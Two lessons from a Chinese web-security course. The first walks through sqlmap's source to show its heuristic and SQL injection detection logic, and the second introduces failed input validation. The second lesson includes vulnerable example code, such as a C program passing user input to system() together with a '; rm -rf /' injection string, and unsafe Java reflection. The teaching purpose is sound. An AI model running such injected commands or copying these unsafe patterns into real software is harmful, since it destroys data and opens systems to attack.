<span class="hljs-comment"># 初始化参数，并根据用户设置的偏好制作payload。</span>
    origValue = conf.paramDict[place][parameter]
    paramType = conf.method <span class="hljs-keyword">if</span> conf.method <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-literal">None</span>, HTTPMETHOD.GET, HTTPMETHOD.POST) <span class="hljs-keyword">else</span> place

    prefix = <span class="hljs-string">""</span>
    suffix = <span class="hljs-string">""</span>
    randStr = <span class="hljs-string">""</span>

    <span class="hljs-keyword">if</span> conf.prefix <span class="hljs-keyword">or</span> conf.suffix:
        <span class="hljs-keyword">if</span> conf.prefix:
            prefix = conf.prefix

        <span class="hljs-keyword">if</span> conf.suffix:
            suffix = conf.suffix

    <span class="hljs-keyword">while</span> randStr.count(<span class="hljs-string">'\''</span>) != <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> randStr.count(<span class="hljs-string">'\"'</span>) != <span class="hljs-number">1</span>:
        randStr = randomStr(length=<span class="hljs-number">10</span>, alphabet=HEURISTIC_CHECK_ALPHABET)

    kb.heuristicMode = <span class="hljs-literal">True</span>

    payload = <span class="hljs-string">"%s%s%s"</span> % (prefix, randStr, suffix)
    payload = agent.payload(place, parameter, newValue=payload)

<span class="hljs-comment"># 利用payload 请求目标页面的响应内容。</span>
    page, _, _ = Request.queryPage(payload, place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)

    kb.heuristicPage = page
    kb.heuristicMode = <span class="hljs-literal">False</span>
</code></pre>

<p>系统首先会判断，用户是否设置跳过启发式注入测试，如果设置了，则返回<code>None</code>。如果没有设置，那么系统就会获取到用户设置的偏好<code>prefix</code>以及<code>suffix</code>，然后据此构造出合适的payload，并发送给目标，获取到响应内容<code>page</code>。</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># 检测请求目标的响应中是否有数据库错误。</span>
   parseFilePaths(page)
   result = wasLastResponseDBMSError()
   infoMsg = <span class="hljs-string">"heuristic (basic) test shows that %sparameter '%s' might "</span> % (<span class="hljs-string">"%s "</span> % paramType <span class="hljs-keyword">if</span> paramType != parameter <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>, parameter)
<span class="hljs-comment"># 检测page中是否有。</span>
   <span class="hljs-keyword">def</span> <span class="hljs-title function_">_</span>(<span class="hljs-params">page</span>):
       <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">in</span> (page <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> FORMAT_EXCEPTION_STRINGS)
   casting = _(page) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> _(kb.originalPage)
</code></pre>

<p>系统会根据获取到的内容，判断其中的报错信息。其中，如果为数据库报错信息，那么<code>result</code>的值为<code>True</code>。如果是设置在</p>

<p><code>sqlmap/lib/core/settings.py</code>文件中<code>FORMAT_EXCEPTION_SRTINGS</code>配置项中定义的类型转化错误信息，那么就会用<code>casting</code>来储存错误内容。</p>

<pre><code class="language-python hljs"><span class="hljs-comment">#     ...</span>
<span class="hljs-comment"># 当存在定义的问题时，发出报错信息。</span>
    <span class="hljs-keyword">if</span> casting:
        errMsg = <span class="hljs-string">"possible %s casting detected (e.g. '"</span> % (<span class="hljs-string">"integer"</span> <span class="hljs-keyword">if</span> origValue.isdigit() <span class="hljs-keyword">else</span> <span class="hljs-string">"type"</span>)

        platform = conf.url.split(<span class="hljs-string">'.'</span>)[-<span class="hljs-number">1</span>].lower()
        <span class="hljs-keyword">if</span> platform == WEB_PLATFORM.ASP:
            errMsg += <span class="hljs-string">"%s=CInt(request.querystring(\"%s\"))"</span> % (parameter, parameter)
        <span class="hljs-keyword">elif</span> platform == WEB_PLATFORM.ASPX:
            errMsg += <span class="hljs-string">"int.TryParse(Request.QueryString[\"%s\"], out %s)"</span> % (parameter, parameter)
        <span class="hljs-keyword">elif</span> platform == WEB_PLATFORM.JSP:
            errMsg += <span class="hljs-string">"%s=Integer.parseInt(request.getParameter(\"%s\"))"</span> % (parameter, parameter)
        <span class="hljs-keyword">else</span>:
            errMsg += <span class="hljs-string">"$%s=intval($_REQUEST[\"%s\"])"</span> % (parameter, parameter)

        errMsg += <span class="hljs-string">"') at the back-end web application"</span>
        logger.error(errMsg)

        <span class="hljs-keyword">if</span> kb.ignoreCasted <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            message = <span class="hljs-string">"do you want to skip those kind of cases (and save scanning time)? %s "</span> % (<span class="hljs-string">"[Y/n]"</span> <span class="hljs-keyword">if</span> conf.multipleTargets <span class="hljs-keyword">else</span> <span class="hljs-string">"[y/N]"</span>)
            kb.ignoreCasted = readInput(message, default=<span class="hljs-string">'Y'</span> <span class="hljs-keyword">if</span> conf.multipleTargets <span class="hljs-keyword">else</span> <span class="hljs-string">'N'</span>, boolean=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 当数据库报错时，判断出注入漏洞很可能存在。</span>
    <span class="hljs-keyword">elif</span> result:
        infoMsg += <span class="hljs-string">"be injectable"</span>
        <span class="hljs-keyword">if</span> Backend.getErrorParsedDBMSes():
            infoMsg += <span class="hljs-string">" (possible DBMS: '%s')"</span> % Format.getErrorParsedDBMSes()
        logger.info(infoMsg)

<span class="hljs-comment"># 否则判定为不存在注入漏洞。</span>
    <span class="hljs-keyword">else</span>:
        infoMsg += <span class="hljs-string">"not be injectable"</span>
        logger.warn(infoMsg)

    kb.heuristicMode = <span class="hljs-literal">True</span>
    kb.disableHtmlDecoding = <span class="hljs-literal">True</span>
</code></pre>

<p>最后，函数会根据<code>casting</code>以及<code>result</code>中的内容进行输出。我在这里画了一个它的流程图，帮助你对它的作用进行理解。</p>

<p><img src="assets/b9438b2accb242d1950fa7b679d6f459.jpg" alt="图片"></p>

<p>图中启发式注入结果分为三种，其中阳性代表该参数大概率可以注入，类型转换和阴性都代表了该参数大概率不可以注入。我们会发现，想要判断是否可以注入，只需要判断有无数据库报错信息就可以了，有的话就认为该参数可注入，否则就认为不可注入。</p>

<p>除了进行启发式SQL注入检测之外，sqlmap还会做一些不属于它的工作，包括进行简单的xss检测和文件包含检测。</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># 更换payload，检测xss以及文件包含。</span>
randStr1, randStr2 = randomStr(NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH), randomStr(NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH)
value = <span class="hljs-string">"%s%s%s"</span> % (randStr1, DUMMY_NON_SQLI_CHECK_APPENDIX, randStr2)
payload = <span class="hljs-string">"%s%s%s"</span> % (prefix, <span class="hljs-string">"'%s"</span> % value, suffix)
payload = agent.payload(place, parameter, newValue=payload)
page, _, _ = Request.queryPage(payload, place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)

paramType = conf.method <span class="hljs-keyword">if</span> conf.method <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-literal">None</span>, HTTPMETHOD.GET, HTTPMETHOD.POST) <span class="hljs-keyword">else</span> place

<span class="hljs-comment"># 进行xss检测。</span>
<span class="hljs-keyword">if</span> value.upper() <span class="hljs-keyword">in</span> (page <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>).upper():
    infoMsg = <span class="hljs-string">"heuristic (XSS) test shows that %sparameter '%s' might be vulnerable to cross-site scripting (XSS) attacks"</span> % (<span class="hljs-string">"%s "</span> % paramType <span class="hljs-keyword">if</span> paramType != parameter <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>, parameter)
    logger.info(infoMsg)

    <span class="hljs-keyword">if</span> conf.beep:
        beep()

<span class="hljs-comment"># 进行文件包含检测。</span>
<span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> re.finditer(FI_ERROR_REGEX, page <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>):
    <span class="hljs-keyword">if</span> randStr1.lower() <span class="hljs-keyword">in</span> match.group(<span class="hljs-number">0</span>).lower():
        infoMsg = <span class="hljs-string">"heuristic (FI) test shows that %sparameter '%s' might be vulnerable to file inclusion (FI) attacks"</span> % (<span class="hljs-string">"%s "</span> % paramType <span class="hljs-keyword">if</span> paramType != parameter <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>, parameter)
        logger.info(infoMsg)

        <span class="hljs-keyword">if</span> conf.beep:
            beep()

        <span class="hljs-keyword">break</span>

kb.disableHtmlDecoding = <span class="hljs-literal">False</span>
kb.heuristicMode = <span class="hljs-literal">False</span>

<span class="hljs-keyword">return</span> kb.heuristicTest
</code></pre>

<p>最终的检测结果都会在全局变量<code>kb</code>中保存起来，这个全局变量我们在之前的课程中学习过。到此，启发式注入检测的函数已经完成，接下来会进入真正的SQL注入检测，这是sqlmap最核心的功能，没有之一！</p>

<h2 id="checksqlinjection函数">checkSqlInjection函数</h2>

<p>sqlmap对启发式注入的检测结果进行简单地判断后，程序就会进入sqlmap最核心的函数checkSqlInjection中。这个函数用于实现注入检测的核心功能，包括布尔注入、联合注入、报错注入、堆注入等检测。</p>

<p>下面让我们观察它的代码来理解这个注入检测功能。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSqlInjection</span>(<span class="hljs-params">place, parameter, value</span>):

<span class="hljs-comment"># 根据参数的类型选择 boundary 。</span>
    injection = InjectionDict()

    threadData = getCurrentThreadData()

    <span class="hljs-keyword">if</span> isDigit(value):
        kb.cache.intBoundaries = kb.cache.intBoundaries <span class="hljs-keyword">or</span> <span class="hljs-built_in">sorted</span>(copy.deepcopy(conf.boundaries), key=<span class="hljs-keyword">lambda</span> boundary: <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">in</span> (boundary.prefix <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>) <span class="hljs-keyword">or</span> _ <span class="hljs-keyword">in</span> (boundary.suffix <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">'"'</span>, <span class="hljs-string">'\''</span>)))
        boundaries = kb.cache.intBoundaries
    <span class="hljs-keyword">elif</span> value.isalpha():
        kb.cache.alphaBoundaries = kb.cache.alphaBoundaries <span class="hljs-keyword">or</span> <span class="hljs-built_in">sorted</span>(copy.deepcopy(conf.boundaries), key=<span class="hljs-keyword">lambda</span> boundary: <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">in</span> (boundary.prefix <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>) <span class="hljs-keyword">or</span> _ <span class="hljs-keyword">in</span> (boundary.suffix <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">'"'</span>, <span class="hljs-string">'\''</span>)))
        boundaries = kb.cache.alphaBoundaries
    <span class="hljs-keyword">else</span>:
        boundaries = conf.boundaries
</code></pre>

<p>这个函数首先会判断参数的类型，然后根据参数的不同类型设置合适的闭合方式。解决完寻找注入点以及闭合参数这个问题后，下面让我们进入到payload的选择中。</p>

<p>我们知道，payload的选择和数据库的类型有很大的关系，所以sqlmap在构造payload前，会先尝试探测目标数据库的类型。</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># 判断是否配置数据库类型。</span>
<span class="hljs-keyword">if</span> conf.dbms <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:

<span class="hljs-comment"># 探测目标数据库类型。</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> injection.dbms <span class="hljs-keyword">and</span> PAYLOAD.TECHNIQUE.BOOLEAN <span class="hljs-keyword">in</span> injection.data:
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> Backend.getIdentifiedDbms() <span class="hljs-keyword">and</span> kb.heuristicDbms <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> kb.droppingRequests:
            kb.heuristicDbms = heuristicCheckDbms(injection)

<span class="hljs-comment"># 根据探测结果输出提示信息。</span>
    <span class="hljs-keyword">if</span> kb.reduceTests <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> conf.testFilter <span class="hljs-keyword">and</span> (intersect(Backend.getErrorParsedDBMSes(), SUPPORTED_DBMS, <span class="hljs-literal">True</span>) <span class="hljs-keyword">or</span> kb.heuristicDbms <span class="hljs-keyword">or</span> injection.dbms):
        msg = <span class="hljs-string">"it looks like the back-end DBMS is '%s'. "</span> % (Format.getErrorParsedDBMSes() <span class="hljs-keyword">or</span> kb.heuristicDbms <span class="hljs-keyword">or</span> joinValue(injection.dbms, <span class="hljs-string">'/'</span>))
        msg += <span class="hljs-string">"Do you want to skip test payloads specific for other DBMSes? [Y/n]"</span>
        kb.reduceTests = (Backend.getErrorParsedDBMSes() <span class="hljs-keyword">or</span> [kb.heuristicDbms]) <span class="hljs-keyword">if</span> readInput(msg, default=<span class="hljs-string">'Y'</span>, boolean=<span class="hljs-literal">True</span>) <span class="hljs-keyword">else</span> []
</code></pre>

<p>如果用户在配置中指定了目标数据库的类型，那么就无需探测，用指定类型即可。否则需要用<code>heuristicCheckDbms(injection)</code>函数来判断目标数据库类型。它的判断方法是，发送一些payload给测试目标，然后根据获得的响应判断数据库的类型。</p>

<p>判断出目标数据库的类型之后，系统会根据获得的数据库类型以及用户的配置，挑选适合的测试用例，然后根据这些测试用例以及之前配置的boundary，构造适合的payload。</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># 配置联合查询的信息。</span>
<span class="hljs-keyword">if</span> stype == PAYLOAD.TECHNIQUE.UNION:
    configUnion(test.request.char)

    <span class="hljs-keyword">if</span> <span class="hljs-string">"[CHAR]"</span> <span class="hljs-keyword">in</span> title:
        <span class="hljs-keyword">if</span> conf.uChar <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">else</span>:
            title = title.replace(<span class="hljs-string">"[CHAR]"</span>, conf.uChar)
<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 用户指定了测试方法的配置。</span>
<span class="hljs-keyword">if</span> conf.technique <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(conf.technique, <span class="hljs-built_in">list</span>) <span class="hljs-keyword">and</span> stype <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> conf.technique:
    debugMsg = <span class="hljs-string">"skipping test '%s' because user "</span> % title
    debugMsg += <span class="hljs-string">"specified testing of only "</span>
    debugMsg += <span class="hljs-string">"%s techniques"</span> % <span class="hljs-string">" &amp; "</span>.join(PAYLOAD.SQLINJECTION[_] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> conf.technique)
    logger.debug(debugMsg)
    <span class="hljs-keyword">continue</span>

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 根据指定的数据库以及用户的配置信息，对payload进行筛选。</span>
<span class="hljs-keyword">if</span> conf.technique <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(conf.technique, <span class="hljs-built_in">list</span>) <span class="hljs-keyword">and</span> stype <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> conf.technique:
    debugMsg = <span class="hljs-string">"skipping test '%s' because user "</span> % title
    debugMsg += <span class="hljs-string">"specified testing of only "</span>
    debugMsg += <span class="hljs-string">"%s techniques"</span> % <span class="hljs-string">" &amp; "</span>.join(PAYLOAD.SQLINJECTION[_] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> conf.technique)
    logger.debug(debugMsg)
    <span class="hljs-keyword">continue</span>

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 对payload去重。</span>
<span class="hljs-keyword">if</span> fstPayload:
    boundPayload = agent.prefixQuery(fstPayload, prefix, where, clause)
    boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
    reqPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)
</code></pre>

<p>sqlmap准备完payload之后，就到了你最期待的注入测试环节，这个过程和我们手动测试类似，系统会使用不同的注入测试方法，包括布尔注入、报错注入、时延注入以及联合注入。</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># 布尔注入</span>
<span class="hljs-keyword">if</span> method == PAYLOAD.METHOD.COMPARISON:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">genCmpPayload</span>():
        sndPayload = agent.cleanupPayload(test.response.comparison, origValue=value <span class="hljs-keyword">if</span> place <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) <span class="hljs-keyword">and</span> BOUNDED_INJECTION_MARKER <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (value <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>)

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 报错注入</span>
<span class="hljs-keyword">elif</span> method == PAYLOAD.METHOD.GREP:
    <span class="hljs-keyword">try</span>:
        page, headers, _ = Request.queryPage(reqPayload, place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)
        output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE)
        output = output <span class="hljs-keyword">or</span> extractRegexResult(check, threadData.lastHTTPError[<span class="hljs-number">2</span>] <span class="hljs-keyword">if</span> wasLastResponseHTTPError() <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>, re.DOTALL | re.IGNORECASE)

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 时延注入</span>
<span class="hljs-keyword">elif</span> method == PAYLOAD.METHOD.TIME:
    trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)
    trueCode = threadData.lastCode

<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># 联合注入</span>
<span class="hljs-keyword">elif</span> method == PAYLOAD.METHOD.UNION:
    configUnion(test.request.char, test.request.columns)
</code></pre>

<p>做完这些注入测试后，系统会收到响应。我们平时会通过观察响应来判断注入是否成功，但是系统要如何判断呢？聪明的你或许想到了，这就是之前我们学习的页面相似度，我们在学习sqlmap判断waf时就用到了它。其实，根据注入方式的不同，sqlmap对于注入结果的判断方式也是不同的。</p>

<p>在报错注入中，系统会通过对页面的响应结果进行正则匹配，判断响应中是否有报错信息，如果有就判断注入成功，否则判断注入失败。</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># 报错注入判断注入是否成功。</span>
page, headers, _ = Request.queryPage(reqPayload, place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)
output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE)
output = output <span class="hljs-keyword">or</span> extractRegexResult(check, threadData.lastHTTPError[<span class="hljs-number">2</span>] <span class="hljs-keyword">if</span> wasLastResponseHTTPError() <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>, re.DOTALL | re.IGNORECASE)
<span class="hljs-comment"># ...</span>
injectable = <span class="hljs-literal">True</span>
</code></pre>

<p>在布尔注入中，系统会判断返回页面的相似度，如果结果为假，那么说明系统会根据错误结果进行不同的响应，这就意味着布尔注入是成功的。</p>

<pre><code class="language-python hljs">falseResult = Request.queryPage(genCmpPayload(), place, raise404=<span class="hljs-literal">False</span>)

<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> falseResult:
    <span class="hljs-comment"># ...</span>

    injectable = <span class="hljs-literal">True</span>
</code></pre>

<p>在时延注入中，sqlmap会发送<code>sleep([random])</code>的请求，判断请求时间是否大于“平均时间+7*标准差”，注意这里的标准差是一个时间阈值，如果大于就认为存在时延注入。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">if</span> trueResult:

    <span class="hljs-keyword">if</span> SLEEP_TIME_MARKER <span class="hljs-keyword">in</span> reqPayload:
        falseResult = Request.queryPage(reqPayload.replace(SLEEP_TIME_MARKER, <span class="hljs-string">"0"</span>), place, timeBasedCompare=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)
        <span class="hljs-keyword">if</span> falseResult:
            <span class="hljs-keyword">continue</span>

<span class="hljs-comment"># ...   </span>
        injectable = <span class="hljs-literal">True</span>
</code></pre>

<p>在联合注入中，系统会通过unionTest函数来判断联合注入是否存在。它的实现原理比较复杂，我们可以将它简化一下，只需要比较联合注入得到的响应和原本内容是否一致，就可以做出判断，如果不一致，则说明存在联合注入问题。</p>

<pre><code class="language-python hljs">reqPayload, vector = unionTest(comment, place, parameter, value, prefix, suffix)

<span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(reqPayload, six.string_types):
    infoMsg = <span class="hljs-string">"%sparameter '%s' is '%s' injectable"</span> % (<span class="hljs-string">"%s "</span> % paramType <span class="hljs-keyword">if</span> paramType != parameter <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>, parameter, title)
    logger.info(infoMsg)

    injectable = <span class="hljs-literal">True</span>
</code></pre>

<p>最后系统将结果记录下来，并且输出给使用者，这就是我们在使用sqlmap时看到的结果信息。</p>

<p>至此，经过四讲的学习，我们终于学完了这款自动化注入测试神器，希望你可以了解sqlmap的底层原理，从而更好的使用这款工具。</p>

<h2 id="总结">总结</h2>

<p>在这节课里，我们深入研究了sqlmap的真正SQL注入过程。为了你能更好的理解，我们主要通过观察它的源代码对它进行学习。</p>

<p>在这个过程中，我们首先学习了sqlmap对于注入点的检测，其中包括了动态参数的检测以及启发式注入测试。在实际注入测试的过程中，我们只会对通过检测的参数进行注入的探测。通过这个过程筛选参数，可以提高sqlmap的运行效率。</p>

<p>最后我们进入到最重要的一步中，即真正的注入测试，我们了解了它的测试过程。其中有payload的配置、对目标数据库信息的探测、筛选合适的payload以及实际的注入测试过程。完成测试，系统会根据页面相似度来判断注入结果，而对于不同的注入方式，sqlmap的判断方式也是不同的。我们将联合注入、报错注入、时延注入以及布尔注入的判断方法一一展开，对它们分别进行了介绍。</p>

<p>截止到目前，你已经完成了对SQL注入原理、攻击方式、防御方案以及自动化注入工具sqlmap的学习，结合对sqlmap原理的学习，快去自己尝试一下自动化注入的威力吧！</p>

<h2 id="思考">思考</h2>

<p>sqlmap在实现中有什么值得改进的地方吗？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="19 失效的输入检测（上）：攻击者有哪些绕过方案？" class="title">19 失效的输入检测（上）：攻击者有哪些绕过方案？</h1>
                            <div><p>你好，我是王昊天。今天我们来学习失效的输入检测，看看攻击者有哪些绕过方案。</p>

<p>在现实生活中，我们在乘坐一些交通工具时，需要经过安检，以防止有人携带危险物品，避免一些危害公众安全的行为。但是这种安全检查也不是万能的，比如进地铁站的时候不会检查我们衣服口袋里的物品。</p>

<p>对于一个交互的系统来说，同样也需要对输入进行安全检查，也同样很难做到万无一失。</p>

<p>交互系统的输入，可能来自用户的输入或者其他系统的传递。在系统获得预期内的输入信息之后，就会将它们当作参数，运行相应的命令来实现自己想要的功能。那么问题来了，如果忽略了对输入的验证或者验证得不够充分，在攻击者的恶意操作下，系统就会接收到预期之外的数据，进而随着命令的运行就让攻击者实现了自己想要的目标，进而产生难以想象的后果。</p>

<p>这，其实就是失效的输入检测。</p>

<p><strong>根据检测技术的不同，失效的输入检测可以分为6种，它们分别是：不安全的输入检查、中间件的输入输出、不安全的映射、编码及转义、编码及混淆、WAF及绕过。</strong></p>

<p>在接下来的2讲内容中，我会带你学习这6种常见的失效输入检测，是如何产生的，以及应该如何应对。</p>

<h2 id="不安全的输入检查">不安全的输入检查</h2>

<p>不安全的输入检查产生的原因，其实很好理解，就是当一个产品需要接收数据的输入时，却没有正确地对这些输入进行验证。</p>

<p>为了抵御这个问题，解决方案也比较简单，开发者只需要对一些输入数据进行安全性验证就可以。但其中的难点在于，如果安全性验证不够充分，攻击者就可以将输入构造成安全人员意料之外的形式，导致系统接收到意料之外的恶意输入。</p>

<p>这是非常危险的，因为攻击者甚至可以借此实现任意命令的执行。</p>

<p>我们来看一个关于消费行为的例子：</p>

<pre><code class="language-c++ hljs language-c">public <span class="hljs-type">static</span> final <span class="hljs-type">double</span> price = <span class="hljs-number">20.00</span>;
# 用户可以自由指定购买商品的数量
<span class="hljs-type">int</span> quantity = currentUser.getAttribute(“quantity”);
# 计算总价
<span class="hljs-type">double</span> total = price * quantity;
chargeUser(total);
</code></pre>

<p>在这段代码中，商品单价的值用户是无法修改的，但没有对购买数量的值进行限制。这时候，如果攻击者提供一个负值，那么他就不用进行消费，反而还能获得相应的收入。</p>

<p>接下来，我们开始学习失效的输入检测的第二种情况：中间件的输入输出。</p>

<h2 id="中间件的输入输出">中间件的输入输出</h2>

<p>通常情况下，一个系统会由多个组件构成。上游组件在接收到外部输入后，会将它传给中间件来构建部分命令、数据结构或记录，然后就将它们发送给下游组件。</p>

<p>需要注意的是，<strong>中间件并不能正确地处理这些输入中的特殊元素。这种失效的输入检测问题，就是中间件的输入输出问题。</strong></p>

<p>我们直接看个例子。</p>

<pre><code class="language-c++ hljs language-c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> {
  <span class="hljs-type">char</span> cmd[CMD_MAX] = <span class="hljs-string">"/usr/bin/cat"</span>;
  <span class="hljs-built_in">strcat</span>(cmd, argv[<span class="hljs-number">1</span>]);
  system(cmd);
}
</code></pre>

<p>如果这个程序是以<code>root</code>权限运行的，那么对<code>system()</code>的调用也会以<code>root</code>权限执行。如果用户传入的参数是标准的文件名，那么调用会按预期工作。</p>

<p>但是，如果攻击者传递了一个恶意输入，比如一个<code>; rm -rf /</code>形式的字符串，那么对<code>system()</code>的调用也会因为缺少参数而无法执行<code>cat</code>命令，从而运行恶意命令，递归删除根分区的内容。</p>

<p>这个示例就是中间件没有对用户传入的恶意输入进行处理导致的。首先，在输入检查就存在问题，导致该输入没有被拦截。其次，中间件没有对这部分信息进行过滤处理，直接将接收到的恶意参数当成了命令来执行，造成了严重的后果。</p>

<p>到这里，我们已经学习了两种最直接的失效的输入检测风险类型，接下来我们再来学习一种更加隐蔽的风险种类，也就是不安全的映射。</p>

<h2 id="不安全的映射">不安全的映射</h2>

<p>不安全的映射发生的场景是：当应用程序需要使用带有映射的外部输入来选择要执行的代码时，却没有充分验证这些外部输入是否合法，这时候攻击者就可以将恶意文件上传到应用会执行的位置。</p>

<p>这对于应用来说是毁灭性的漏洞，非常危险。我们再通过一个例子，来理解下这种漏洞是怎么产生的吧。</p>

<p>下面这个例子，显示了一个不使用映射的命令调度程序，它的代码书写方式看起来并不十分优雅：</p>

<pre><code class="language-java hljs"><span class="hljs-type">String</span> <span class="hljs-variable">ctl</span> <span class="hljs-operator">=</span> request.getParameter(“ctl”);
<span class="hljs-type">Worker</span> <span class="hljs-variable">ao</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

<span class="hljs-comment">// 判断是否ctl参数中是Add字符串</span>
<span class="hljs-keyword">if</span> (ctl.equals(<span class="hljs-string">"Add"</span>))
{
  ao = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AddCommand</span>();
}
<span class="hljs-comment">// 判断是否ctl参数中是Modify字符串</span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ctl.equals(<span class="hljs-string">"Modify"</span>))
{
  ao = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModifyCommand</span>();
}
<span class="hljs-keyword">else</span> {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnknownActionError</span>();
}
ao.doAction(request);
</code></pre>

<p>我们品味一番，可以发现上述代码写得属实不够优雅，而优秀的开发人员可能会使用映射的方式来进行代码重构，如下所示：</p>

<pre><code class="language-java hljs"><span class="hljs-type">String</span> <span class="hljs-variable">ctl</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"ctl"</span>);
<span class="hljs-type">Class</span> <span class="hljs-variable">cmdClass</span> <span class="hljs-operator">=</span> Class.forName(ctl + <span class="hljs-string">"Command"</span>);
<span class="hljs-type">Worker</span> <span class="hljs-variable">ao</span> <span class="hljs-operator">=</span> (Worker)cmdClass.newInstance();
ao.doAction(request);
</code></pre>

<p>重构后的这段代码，确实提供了许多优势：代码更加简洁了；if/else块也消失了；在不修改命令调度程序的情况下，也可以添加新的命令类型。</p>

<p>但是，重构后的代码有个漏洞。攻击者可以先利用Worker接口创建一个类，然后使用它们。这里创建的类是没有限制的，它是由攻击者控制的参数ctl所决定。攻击者可以利用创建的这个类去执行恶意命令。</p>

<h2 id="编码及转义">编码及转义</h2>

<p>软件为了与另一个组件通信，会准备要发送的消息。它的结构需要符合通信协议的要求，如果数据的编码或转义过程中发生丢失或者执行错误，就可能会导致消息的结构发生变化。</p>

<p>不正确的编码或转义，可能允许攻击者将发送的正常命令更改为恶意命令。大多数软件都会遵循双方规定的协议进行通信。通信消息可以为带有控制信息的原始数据。</p>

<p>这么说有些抽象，我们看一个具体的示例：</p>

<pre><code class="language-plain">“GET/index.html HTTP/1.1”是一个结构化消息，其中包含一个命令（“GET”）和一个参数（“/index.html”）和有关正在使用的协议版本（“HTTP/1.1”）。
</code></pre>

<p>如果应用程序使用攻击者提供的输入来构建结构化消息，而没有正确编码或转义，那么攻击者就可以在这条消息中插入特殊字符，导致数据被解释为控制信息。因此，接收输出的组件，就将会执行错误的操作。</p>

